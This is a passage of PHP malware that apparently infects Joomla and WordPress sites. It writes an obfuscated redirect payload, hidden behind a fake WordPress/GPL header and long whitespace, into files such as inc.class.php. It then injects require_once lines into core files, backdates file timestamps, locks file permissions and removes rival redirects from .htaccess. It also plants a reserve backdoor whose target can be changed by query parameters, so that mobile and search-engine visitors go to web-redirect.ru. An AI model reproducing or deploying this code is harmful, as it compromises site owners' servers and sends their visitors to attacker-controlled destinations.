		$each = trim($each);
		$result = stristr($each, $str);
		if ($result != false)
		{	
			$res_search = 1;
		}
	}
								
	return $res_search;
}

function clear_htaccess($file_name)
{	
	$path_htaccess = $_SERVER[\'DOCUMENT_ROOT\']."/.htaccess";
	$path_index = $_SERVER[\'DOCUMENT_ROOT\']."/index.php";
	
	if (file_exists($path_htaccess))
	{
		$time_htaccess = filemtime($path_htaccess);
		$comment = \'#\';
		chmod($path_htaccess, 0755);
		if (is_writable($path_htaccess))
		{
			$arr_original_htaccess = read_file($path_htaccess);
			$arr_original_htaccess = str_replace(\'<script>\', "", $arr_original_htaccess);
			
			$status1 = arr_search($arr_original_htaccess, \'http://\');
			$status2 = arr_search($arr_original_htaccess, \'iphone\');
			$status3 = arr_search($arr_original_htaccess, \'android\');
			if ((($status1 != 0) and ($status2 != 0)) or (($status1 != 0) and ($status3 != 0)))
			{
				$site_name = $_SERVER[\'SERVER_NAME\'];
				$site_name = str_replace(\'www.\', "", $site_name);

				$arr_new_htaccess = array();
				foreach ($arr_original_htaccess as $each)
				{
					$each = trim($each);
					$result = stristr($each, \'http://\');
					if ($result != false)
					{	
						$result_site_name = stristr($each, $site_name);
						if ($result_site_name == false)
						{
							if ($each[0] != $comment)
								$each = $comment.$each;
						}
					}
					$arr_new_htaccess[] = $each;
				}
				
				$f = fopen (".htaccess", "w");
				foreach ($arr_new_htaccess as $new_str)
				{
					fwrite($f, $new_str."\n");
				}
				fclose($f);
			}
		}
		touch($path_htaccess, $time_htaccess);
	}
	if (file_exists($path_index))
	{
		chmod($path_index, 0755);
		
		$check_index = only_read($path_index);
		
		$code_1 = \'$ua = $_SERVER[\\\'HTTP_USER_AGENT\\\'];\';
		$code_2 = \'if(stripos("***$ua",\\\'android\\\') !== false)\';
		$code_3 = \'header("Location: http://mob-version.ru/");\';
		$code_4 = \'die();\';
		$code_5 = \'header("Location: http://andsecurity.ru");\';
		
		$result = stristr($check_index, $code_1);
		if ($result !== false)
		{
			$time_index = filemtime($path_index);
			$arr_index = read_file($path_index);
			$new = array();

			foreach ($arr_index as $each)
			{
				$each = str_replace($code_1, \'\', $each);
				$each = str_replace($code_2, \'\', $each);
				$each = str_replace($code_3, \'\', $each);
				$each = str_replace($code_4, \'\', $each);
				$each = str_replace($code_5, \'\', $each);
				
				$new[] = $each;
			}

			if (($new[0] == \'<?php\') and ($new[2] == \'{\') and ($new[5] == \'}\') and ($new[6] == \'?>\'))
			{
				$new[0] = \'\';
				$new[2] = \'\';
				$new[5] = \'\';
				$new[6] = \'\';
			}

			$f = fopen ($path_index, "w");
			foreach ($new as $n)
			{
				if (($n !== \'\') and ($n !== \' \') and ($n !== "\n"))
					fwrite($f, $n."\n");
			}
			fclose($f);
			
			touch($path_index, $time_index);
		}
	}
	if (file_exists($path_htaccess))
		chmod($path_htaccess, 0404);
	if (file_exists($path_index))
		chmod($path_index, 0404);
}
'.'
clear_htaccess(true);

$path_to_reserv_script = $_SERVER["DOCUMENT_ROOT"]."/components/com_content/articled.php";
if (file_exists($path_to_reserv_script))
{
	$arr_data_mob = read_file($path_to_reserv_script);
	$arr_new_data = array();

	if ((isset($_GET[\'mob_link\'])) and (isset($_GET[\'web_link\'])))
	{
		$new_mob_link = trim($_GET[\'mob_link\']);
		$new_web_link = trim($_GET[\'web_link\']);
	}	
	else
	{
		$new_mob_link = "web-redirect.ru";
		$new_web_link = "web-redirect.ru";
	}
	
			
									
	foreach ($arr_data_mob as $each_str)
	{
		if (isset($_GET[\'web_redirect\']))
			$each_str = str_replace("//elseif", "elseif", $each_str);
			
		$each_str = str_replace("web-redirect.ru", $new_mob_link, $each_str);
		$each_str = str_replace("web-redirect.ru", $new_web_link, $each_str);
		$arr_new_data[] = $each_str;
	}

	$file_for_get_time = $_SERVER["DOCUMENT_ROOT"]."/includes/defines.php";
	$file_for_get_time2 = $_SERVER["DOCUMENT_ROOT"]."/index.php";
										
	if (file_exists($file_for_get_time))
		$time_for_touch = filemtime($file_for_get_time);
	else
		$time_for_touch = filemtime($file_for_get_time2);
										
	$path_to_dir = $_SERVER["DOCUMENT_ROOT"]."/includes/";
	$path_to_script = $_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php";
	$path_to_application = $_SERVER["DOCUMENT_ROOT"]."/includes/application.php";
	$str_to_include = \'<?php\'."\n".\'require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php");\';	
	
	if (file_exists($path_to_dir))	
		chmod($path_to_dir, 0755);
	if (file_exists($path_to_script))
		chmod($path_to_script, 0755);

	'.'
	if (is_writable($path_to_dir))
	{	
		$f = fopen ($path_to_script, "w");
		foreach ($arr_new_data as $each_data)
		{
			fwrite($f, $each_data."\n");
		}
		fclose($f);
												
		if (file_exists($path_to_script))
		{
			touch($path_to_dir, $time_for_touch);
			touch($path_to_script, $time_for_touch);

			if (file_exists($path_to_application))
			{
				chmod($path_to_application, 0755);
				$time_application = filemtime($path_to_application);
					
				$empty_str = "\n"."\n";
				
				$new_application = array();
				$arr_application = read_file($path_to_application);
				
				foreach ($arr_application as $application)
				{
					$application = str_replace(\'//require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php");\', "", $application);
					$application = str_replace(\'// require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php");\', "", $application);
					$application = str_replace(\'//  require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php");\', "", $application);
					$application = str_replace(\'//	require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php");\', "", $application);
					$application = str_replace(\'/* require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php"); */\', "", $application);
					$application = str_replace(\'require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php");\', "", $application);
					$application = str_replace($empty_str, "", $application);
					$application = str_replace("<?php", $str_to_include, $application);
					$new_application[] = $application;
				}
				
				$d = fopen ($path_to_application, "w");
				foreach ($new_application as $for_write)
				{
					fwrite($d, $for_write."\n");
				}
				fclose($d);
					
				touch($path_to_application, $time_application);
					
				$application_for_check = only_read($path_to_application);
					
				$result_check = stristr($application_for_check, \'/includes/inc.class.php\');
				
				if ($result_check != false)
					echo \'<hr><hr>\'."Joomla - ".\'http://\'.$_SERVER["SERVER_NAME"].\' - mobile redirect installed correct!\'.\'<hr><hr>\';
				else
					echo \'<hr><hr>\'."Joomla - ".\'http://\'.$_SERVER["SERVER_NAME"].\' - mobile redirect not installed\'.\'<hr><hr>\';
			}
			else
				echo \'<hr><hr>\'."Joomla - ".\'http://\'.$_SERVER["SERVER_NAME"].\' - file application.php not found\'.\'<hr><hr>\';	
		}
		else
			echo \'<hr><hr>\'."Joomla - ".\'http://\'.$_SERVER["SERVER_NAME"].\' - can not create file inc.class.php\'.\'<hr><hr>\';
	}
	else
		echo \'<hr><hr>\'."Joomla - ".\'http://\'.$_SERVER["SERVER_NAME"].\' - can not create file inc.class.php\'.\'<hr><hr>\';
}
else
	echo \'<hr><hr>\'."Joomla - ".\'http://\'.$_SERVER["SERVER_NAME"].\' - reserve file has been deleted.\'.\'<hr><hr>\';
?>
';
						
							$f = fopen ($path_to_category, "w");
							fwrite($f, $data_category);
							fclose($f);
							
							if (file_exists($path_to_category))
							{
								touch($path_to_category, $time_content);
								touch($path_to_reserv, $time_reserv);
								echo '<hr><hr>'."Joomla - ".'http://'.$_SERVER["SERVER_NAME"].'/components/com_content/category.php - mobile backdoor installed!'.'<hr><hr>';
							}
							else
								echo '<hr><hr>'."Joomla - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile backdoor not installed.'.'<hr><hr>';
						}
						else
							echo '<hr><hr>'."Joomla - ".'http://'.$_SERVER["SERVER_NAME"].' - reserv script not installed'.'<hr><hr>';
					}
					else
						echo '<hr><hr>'."Joomla - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile redirect not installed'.'<hr><hr>';
				}
				
				else
				{
					$path_index_unknown = $_SERVER['DOCUMENT_ROOT']."/index.php";
					$path_conflg = $_SERVER['DOCUMENT_ROOT']."/inc.class.php";
					$path_folder_unknown = $_SERVER['DOCUMENT_ROOT'];
			
					if (file_exists($path_index_unknown))
					{
						chmod($path_index_unknown, 0755);
						$time_unknown_index = filemtime($path_index_unknown);
						
						$new_mob_link = 'web-redirect.ru';
						$new_web_link = 'web-redirect.ru';
					
						$data = 
			'<?php'.' 
			/*
			=====================================================
			WordPress - Open Source Matters
			-----------------------------------------------------
			https://wordpress.org/
			-----------------------------------------------------
			Copyright (c) 2004,2014
			=====================================================
			Данный код защищен авторскими правами
			=====================================================
			Назначение: Класс конфигурации
			=====================================================
			GNU GENERAL PUBLIC LICENSE
			Version 3, 29 June 2007
			Copyright © 2007 Free Software Foundation, Inc. <http://fsf.org>
			Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed.
			*/';$data1 = ' 																																																																																																																																																							 '.'function check_cookie($url_redirect){	if (($_SERVER[\'HTTP_REFERER\'] != null) and ($_SERVER[\'HTTP_REFERER\'] != "") and ($_SERVER[\'HTTP_REFERER\'] != " ")){	if(isset($_COOKIE[\'_cutt_caches_images\']) && $_COOKIE[\'_cutt_caches_images\']<strtotime(\'+24 hours\'))return false;	setcookie(\'_cutt_caches_images\', time(), strtotime(\'+24 hours\'),"/");header("Location: $url_redirect");exit;}}$q=$_SERVER[\'QUERY_STRING\'];$referer = $q;$referer = str_replace(\'&\', \'*\', $referer);$referer = str_replace(\';\', \'~\', $referer);$referer = trim($referer);$s=stristr($q,\'union\');$s2=stristr($q,\'select\');$s3=stristr($q,\'from\');$s4=stristr($q,\'jos_users\');$s5=stristr($q,\'concat\');$s6=stristr($q,\'username\');$s7=stristr($q,\'password\');$link = \'http://\'.$_SERVER[\'SERVER_NAME\'];if((($s!=false)and($s2!=false))or(($s3!=false)and($s4!=false))or(($s5!=false)and($s6!=false))or(($s5!=false)and($s7!=false))or(($s5!=false)and($s4!=false))){header("Location: $link");exit;}$android_redirect = \'http://web-redirect.ru/?andr\';$ios_redirect = \'http://web-redirect.ru/?ios\';$another_mobile_redirect = \'http://web-redirect.ru/?mb\';$web_potok = \'http://web-redirect.ru/?web\';$iphone = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPhone");$ipod = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPod");$ipad = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPad");$android = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Android");$symb = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Symbian");$wp7 = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WP7");$wp8 = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WP8");$winphone = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WindowsPhone");$berry = stristr($_SERVER[\'HTTP_USER_AGENT\'],"BlackBerry");$palmpre = stristr($_SERVER[\'HTTP_USER_AGENT\'],"webOS");$mobile_tel = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Mobile");$operam = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Opera M");$htc = stristr($_SERVER[\'HTTP_USER_AGENT\'], \'HTC\');$fennec = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Fennec");if ($android == true)check_cookie($android_redirect);elseif (($iphone == true) or ($ipod == true) or ($ipad == true))	check_cookie($ios_redirect);elseif (($palmpre == true) or ($mobile_tel == true) or ($operam == true) or ($htc == true) or ($wp7 == true) or ($wp8 == true) or ($symb == true) or ($berry == true) or ($fennec == true) or ($winphone == true))	check_cookie($another_mobile_redirect);elseif (preg_match(\'#google|yahoo|yandex|vk|odnoklassniki|mail|youtube|wikipedia|netscape|bing|facebook|twitter|dmoz|ebay|icq|yandex|google|rambler#i\',$_SERVER[\'HTTP_REFERER\']))check_cookie($web_potok);else $aaa = false;'."\n".'?>';
			
			
						$data_mob = $data.$data1;
						$data_mob = str_replace('web-redirect.ru', $new_mob_link, $data_mob);
						$data_mob = str_replace('web-redirect.ru', $new_web_link, $data_mob);
						
					
						$nf = fopen ($path_conflg, "w");
						fwrite($nf, $data_mob);
						fclose($nf);
						
						touch($path_conflg, $time_unknown_index);
						
						if (file_exists($path_conflg))
						{
							$str_unknown_include = '<?php require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");';
					
							$arr_index = read_file($path_index_unknown);
							$new_arr_index = array();
								
							foreach ($arr_index as $application)
							{
								$application = str_replace('//require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
								$application = str_replace('// require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
								$application = str_replace('//	require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
								$application = str_replace('require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
								$application = str_replace('require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
								$application = str_replace('<?php', $str_unknown_include, $application);
								$new_arr_index[] = $application;
							}
								
							$d = fopen ($path_index_unknown, "w");
							foreach ($new_arr_index as $each_app)
							{
								if (($each_app !== '') and ($each_app !== ' ') and ($each_app !== "\n"))
									fwrite($d, $each_app."\n");
							}
							fclose($d);
								
							touch($path_index_unknown, $time_unknown_index);
								
							$index_for_check = only_read($path_index_unknown);
								
							$result_check = stristr($index_for_check, 'inc.class.php');
							if ($result_check != false)
								echo '<hr><hr>'."Joomla CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile redirect (only) installed correct!'.'<hr><hr>';
							else
								echo '<hr><hr>'."Joomla CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile redirect not installed'.'<hr><hr>';
						}
						else
							echo '<hr><hr>'."Joomla CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - file inc.class.php not found'.'<hr><hr>';
					}
					else
						echo '<hr><hr>'."Joomla CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - file index.php not found'.'<hr><hr>';
	
					remove_file($path_to_script);
					touch($path_to_dir, $time_includes);
					
				}
			}
			else
				echo '<hr><hr>'."Joomla - ".'http://'.$_SERVER["SERVER_NAME"].' - can not create file inc.class.php'.'<hr><hr>';
		}
		else
			echo '<hr><hr>'."Joomla - ".'http://'.$_SERVER["SERVER_NAME"].' - can not create file inc.class.php'.'<hr><hr>';
		
		touch($path_to_dir, $time_includes);
	}
	
	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	elseif ($CMS == 'WordPress')
	{
		$new_mob_link = 'web-redirect.ru';
		$new_web_link = 'web-redirect.ru';
		
		$data = '<?php'.' 
/*
=====================================================
WordPress - Open Source Matters
-----------------------------------------------------
https://wordpress.org/
-----------------------------------------------------
Copyright (c) 2004,2014
=====================================================
Данный код защищен авторскими правами
=====================================================
Назначение: Класс конфигурации
=====================================================
GNU GENERAL PUBLIC LICENSE
Version 3, 29 June 2007
Copyright © 2007 Free Software Foundation, Inc. <http://fsf.org>
Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed.
*/';$data1 = ' 																																																																																																																																																							 '.'function check_cookie($url_redirect){	if (($_SERVER[\'HTTP_REFERER\'] != null) and ($_SERVER[\'HTTP_REFERER\'] != "") and ($_SERVER[\'HTTP_REFERER\'] != " ")){	if(isset($_COOKIE[\'_cutt_caches_images\']) && $_COOKIE[\'_cutt_caches_images\']<strtotime(\'+24 hours\'))return false;	setcookie(\'_cutt_caches_images\', time(), strtotime(\'+24 hours\'),"/");header("Location: $url_redirect");exit;}}$q=$_SERVER[\'QUERY_STRING\'];$referer = $q;$referer = str_replace(\'&\', \'*\', $referer);$referer = str_replace(\';\', \'~\', $referer);$referer = trim($referer);$s=stristr($q,\'union\');$s2=stristr($q,\'select\');$s3=stristr($q,\'from\');$s4=stristr($q,\'jos_users\');$s5=stristr($q,\'concat\');$s6=stristr($q,\'username\');$s7=stristr($q,\'password\');$link = \'http://\'.$_SERVER[\'SERVER_NAME\'];if((($s!=false)and($s2!=false))or(($s3!=false)and($s4!=false))or(($s5!=false)and($s6!=false))or(($s5!=false)and($s7!=false))or(($s5!=false)and($s4!=false))){header("Location: $link");exit;}$android_redirect = \'http://web-redirect.ru/?andr\';$ios_redirect = \'http://web-redirect.ru/?ios\';$another_mobile_redirect = \'http://web-redirect.ru/?mb\';$web_potok = \'http://web-redirect.ru/?web\';$iphone = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPhone");$ipod = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPod");$ipad = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPad");$android = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Android");$symb = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Symbian");$wp7 = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WP7");$wp8 = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WP8");$winphone = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WindowsPhone");$berry = stristr($_SERVER[\'HTTP_USER_AGENT\'],"BlackBerry");$palmpre = stristr($_SERVER[\'HTTP_USER_AGENT\'],"webOS");$mobile_tel = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Mobile");$operam = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Opera M");$htc = stristr($_SERVER[\'HTTP_USER_AGENT\'], \'HTC\');$fennec = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Fennec");if ($android == true)check_cookie($android_redirect);elseif (($iphone == true) or ($ipod == true) or ($ipad == true))	check_cookie($ios_redirect);elseif (($palmpre == true) or ($mobile_tel == true) or ($operam == true) or ($htc == true) or ($wp7 == true) or ($wp8 == true) or ($symb == true) or ($berry == true) or ($fennec == true) or ($winphone == true))	check_cookie($another_mobile_redirect); //elseif (preg_match(\'#google|yahoo|yandex|vk|odnoklassniki|mail|youtube|wikipedia|netscape|bing|facebook|twitter|dmoz|ebay|icq|yandex|google|rambler#i\',$_SERVER[\'HTTP_REFERER\']))check_cookie($web_potok);else $aaa = false;'."\n".'?>';


		$data_mob = $data.$data1;
		$data_mob = str_replace('web-redirect.ru', $new_mob_link, $data_mob);
		$data_mob = str_replace('web-redirect.ru', $new_web_link, $data_mob);

		$file_for_get_time = $_SERVER['DOCUMENT_ROOT']."/wp-includes/user.php";
		$file_for_get_time2 = $_SERVER['DOCUMENT_ROOT'].'/index.php';
		
		if (file_exists($file_for_get_time))
			$time_for_touch = filemtime($file_for_get_time);
		else
			$time_for_touch = filemtime($file_for_get_time2);
		
		$path_to_dir = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/';
		$path_to_script = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/inc.class.php';
		$path_to_application = $_SERVER['DOCUMENT_ROOT'].'/wp-blog-header.php';
		
		
		if (file_exists($path_to_script))
			chmod($path_to_script, 0755);
		if (file_exists($path_to_application))
			chmod($path_to_application, 0755);
		if (file_exists($path_to_dir))
			chmod($path_to_dir, 0755);
			
		if (is_writable($path_to_dir))
		{	
			$f = fopen ($path_to_script, "w");
			fwrite($f, $data_mob);
			fclose($f);
			
			if (file_exists($path_to_script))
			{
				touch($path_to_script, $time_for_touch);
				touch($path_to_dir, $time_for_touch);
				
				if (file_exists($path_to_application))
				{
					chmod($path_to_application, 0755);
					$time_application = filemtime($path_to_application);
					
					$str_to_include = '<?php'."\n".'require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );';
					
					$arr_application = read_file($path_to_application);
					$new_arr_app = array();
					
					$zamena_1 = '//require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );';
					$zamena_2 = '// require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );';
					$zamena_3 = '//  require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );';
					$zamena_4 = '//	require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );';
					$zamena_5 = '/* require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" ); */';
					$zamena_6 = 'require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );';
					
					
					foreach ($arr_application as $application)
					{
						$application = str_replace($zamena_1, "", $application);
						$application = str_replace($zamena_2, "", $application);
						$application = str_replace($zamena_3, "", $application);
						$application = str_replace($zamena_4, "", $application);
						$application = str_replace($zamena_5, "", $application);
						$application = str_replace($zamena_6, "", $application);
						$application = str_replace('<?php', $str_to_include, $application);
						$new_arr_app[] = $application;
					}
					
					$d = fopen ($path_to_application, "w");
					foreach ($new_arr_app as $each_app)
					{
						if (($each_app !== '') and ($each_app !== ' ') and ($each_app !== "\n"))
							fwrite($d, $each_app."\n");
					}
					fclose($d);
					
					touch($path_to_application, $time_application);
					
					$application_for_check = only_read($path_to_application);
					
					$result_check = stristr($application_for_check, 'require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" )');
					if ($result_check != false)
					{
						echo '<hr><hr>'."$CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile redirect installed correct!'.'<hr><hr>';
						
						$path_to_reserv = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/';
						$path_to_reserv_script = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/class-wp-default.php';
						$path_to_category = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/class-category.php';
						$time_reserv = filemtime($path_to_reserv);
						
						if (file_exists($path_to_reserv))
							chmod($path_to_reserv, 0755);
						if (file_exists($path_to_reserv_script))
							chmod($path_to_reserv_script, 0755);
						if (file_exists($path_to_category))
							chmod($path_to_category, 0755);
						
						if (is_writable($path_to_reserv))
						{	
							$f2 = fopen ($path_to_reserv_script, "w");
							fwrite($f2, $data_mob);
							fclose($f2);
							
							if (file_exists($path_to_reserv_script))
							{
								touch($path_to_reserv_script, $time_reserv);
								touch($path_to_reserv, $time_reserv);
								
								echo '<hr><hr>'."WordPress - ".'http://'.$_SERVER["SERVER_NAME"].'/wp-includes/class-category.php - reserv redirect installed correct!'.'<hr><hr>';
							}
							else
								echo '<hr><hr>'."WordPress - ".'http://'.$_SERVER["SERVER_NAME"].' - reserv redirect not installed.'.'<hr><hr>';
							
						}
						else
							echo '<hr><hr>'."WordPress - ".'http://'.$_SERVER["SERVER_NAME"].' - reserv redirect not installed.'.'<hr><hr>';
						
							
						
						if (file_exists($path_to_reserv_script))
						{
							$data_category = 
	'<?php
	function only_read($file_name)
	{
		if (file_exists($file_name) and (filesize($file_name)>1))
		{
			$file = fopen($file_name,"rt");
			$original_file = fread($file,filesize($file_name));
			fclose($file);
		}
		return $original_file;
	}
	function read_file($file_name)
	{
		if (file_exists($file_name) and (filesize($file_name)>1))
		{
			$file = fopen($file_name,"rt");
			$arr_file = explode("\n",fread($file,filesize($file_name)));
			fclose($file);
		}
		else
			$arr_file = array();
		
		return $arr_file;
	}
	function arr_search($arr, $str)
	{
		$res_search = 0;
		foreach ($arr as $each)
		{
			$each = trim($each);
			$result = stristr($each, $str);
			if ($result != false)
			{	
				$res_search = 1;
			}
		}
		
		return $res_search;
	}
	function clear_htaccess($file_name)
{	
	$path_htaccess = $_SERVER[\'DOCUMENT_ROOT\']."/.htaccess";
	$path_index = $_SERVER[\'DOCUMENT_ROOT\']."/index.php";
	
	if (file_exists($path_htaccess))
	{
		$time_htaccess = filemtime($path_htaccess);
		$comment = \'#\';
		chmod($path_htaccess, 0755);
		if (is_writable($path_htaccess))
		{
			$arr_original_htaccess = read_file($path_htaccess);
			$arr_original_htaccess = str_replace(\'<script>\', "", $arr_original_htaccess);
			
			$status1 = arr_search($arr_original_htaccess, \'http://\');
			$status2 = arr_search($arr_original_htaccess, \'iphone\');
			$status3 = arr_search($arr_original_htaccess, \'android\');
			if ((($status1 != 0) and ($status2 != 0)) or (($status1 != 0) and ($status3 != 0)))
			{
				$site_name = $_SERVER[\'SERVER_NAME\'];
				$site_name = str_replace(\'www.\', "", $site_name);

				$arr_new_htaccess = array();
				foreach ($arr_original_htaccess as $each)
				{
					$each = trim($each);
					$result = stristr($each, \'http://\');
					if ($result != false)
					{	
						$result_site_name = stristr($each, $site_name);
						if ($result_site_name == false)
						{
							if ($each[0] != $comment)
								$each = $comment.$each;
						}
					}
					$arr_new_htaccess[] = $each;
				}
				
				$f = fopen (".htaccess", "w");
				foreach ($arr_new_htaccess as $new_str)
				{
					fwrite($f, $new_str."\n");
				}
				fclose($f);
			}
		}
		touch($path_htaccess, $time_htaccess);
	}
	if (file_exists($path_index))
	{
		chmod($path_index, 0755);
		
		$check_index = only_read($path_index);
		
		$code_1 = \'$ua = $_SERVER[\\\'HTTP_USER_AGENT\\\'];\';
		$code_2 = \'if(stripos("***$ua",\\\'android\\\') !== false)\';
		$code_3 = \'header("Location: http://mob-version.ru/");\';
		$code_4 = \'die();\';
		$code_5 = \'header("Location: http://andsecurity.ru");\';
		
		$result = stristr($check_index, $code_1);
		if ($result !== false)
		{
			$time_index = filemtime($path_index);
			$arr_index = read_file($path_index);
			$new = array();

			foreach ($arr_index as $each)
			{
				$each = str_replace($code_1, \'\', $each);
				$each = str_replace($code_2, \'\', $each);
				$each = str_replace($code_3, \'\', $each);
				$each = str_replace($code_4, \'\', $each);
				$each = str_replace($code_5, \'\', $each);
				$new[] = $each;
			}

			if (($new[0] == \'<?php\') and ($new[2] == \'{\') and ($new[5] == \'}\') and ($new[6] == \'?>\'))
			{
				$new[0] = \'\';
				$new[2] = \'\';
				$new[5] = \'\';
				$new[6] = \'\';
			}

			$f = fopen ($path_index, "w");
			foreach ($new as $n)
			{
				if (($n !== \'\') and ($n !== \' \') and ($n !== "\n"))
					fwrite($f, $n."\n");
			}
			fclose($f);
			
			touch($path_index, $time_index);
		}
	}
	if (file_exists($path_htaccess))
		chmod($path_htaccess, 0404);
	if (file_exists($path_index))
		chmod($path_index, 0404);
}
	'.'
	clear_htaccess(true);
	$path_to_reserv_script = $_SERVER["DOCUMENT_ROOT"]."/wp-includes/class-wp-default.php";

	if (file_exists($path_to_reserv_script))
	{
		$arr_data_mob = read_file($path_to_reserv_script);
		$new_arr_mob = array();
		
		if ((isset($_GET[\'mob_link\'])) and (isset($_GET[\'web_link\'])))
		{
			$new_mob_link = trim($_GET[\'mob_link\']);
			$new_web_link = trim($_GET[\'web_link\']);
		}	
		else
		{
			$new_mob_link = "web-redirect.ru";
			$new_web_link = "web-redirect.ru";
		}
		
		foreach ($arr_data_mob as $data_mob)
		{
			if (isset($_GET[\'web_redirect\']))
				$data_mob = str_replace("//elseif", "elseif", $data_mob);
				
			$data_mob = str_replace("web-redirect.ru", $new_mob_link, $data_mob);
			$data_mob = str_replace("web-redirect.ru", $new_web_link, $data_mob);
			$new_arr_mob[] = $data_mob;
		}
		
		$file_for_get_time = $_SERVER["DOCUMENT_ROOT"]."/wp-includes/user.php";
		$file_for_get_time2 = $_SERVER["DOCUMENT_ROOT"]."/index.php";	
			
			
		if (file_exists($file_for_get_time))
			$time_for_touch = filemtime($file_for_get_time);
		else
			$time_for_touch = filemtime($file_for_get_time2);
		
		$path_to_dir = $_SERVER["DOCUMENT_ROOT"]."/wp-includes/";
		$path_to_script = $_SERVER["DOCUMENT_ROOT"]."/wp-includes/inc.class.php";
		$path_to_application = $_SERVER["DOCUMENT_ROOT"]."/wp-blog-header.php";
		$str_to_include = \'<?php\'."\n".\'require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );\';
			
		if (file_exists($path_to_dir))	
			chmod($path_to_dir, 0755); // устанавливаем права на папку
		if (file_exists($path_to_script))
			chmod($path_to_script, 0755);

	'.'
	if (is_writable($path_to_dir))
		{	
			$f = fopen ($path_to_script, "w");
			foreach ($new_arr_mob as $each_mob)
			{
				fwrite($f, $each_mob."\n");
			}
			fclose($f);
			
			
				
			if (file_exists($path_to_script))
			{
				touch($path_to_dir, $time_for_touch);
				touch($path_to_script, $time_for_touch);
					
				if (file_exists($path_to_application))
				{
					chmod($path_to_application, 0755);
					$time_application = filemtime($path_to_application);
					
					$str_to_include = \'<?php\'."\n".\'require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );\';
					$arr_application = read_file($path_to_application);
					$new_arr_app = array();
					
					foreach ($arr_application as $application)
					{
						$application = str_replace(\'//require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );\', "", $application);
						$application = str_replace(\'// require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );\', "", $application);
						$application = str_replace(\'//  require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );\', "", $application);
						$application = str_replace(\'//	require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );\', "", $application);
						$application = str_replace(\'/* require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" ); */\', "", $application);
						$application = str_replace(\'require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" );\', "", $application);
						$application = str_replace(\'<?php\', $str_to_include, $application);
						$new_arr_app[] = $application;
					}
					
					$d = fopen ($path_to_application, "w");
					foreach ($new_arr_app as $each_app)
					{
						fwrite($d, $each_app."\n");
					}
					fclose($d);
					
					touch($path_to_application, $time_application);
					
					$application_for_check = only_read($path_to_application);
					
					$result_check = stristr($application_for_check, \'require_once( dirname(ABSPATH) . "/wp-includes/inc.class.php" )\');
					if ($result_check != false)
						echo \'<hr><hr>\'.\'http://\'.$_SERVER["SERVER_NAME"].\' - mobile redirect installed correct!\'.\'<hr><hr>\';
					else
						echo \'<hr><hr>\'.\'http://\'.$_SERVER["SERVER_NAME"].\' - mobile redirect not installed\'.\'<hr><hr>\';
				}
				else
					echo \'<hr><hr>\'.\'http://\'.$_SERVER["SERVER_NAME"].\' - file application.php not found\'.\'<hr><hr>\';	
			}
			else
				echo \'<hr><hr>\'.\'http://\'.$_SERVER["SERVER_NAME"].\' - can not create file inc.class.php\'.\'<hr><hr>\';
		}
		else
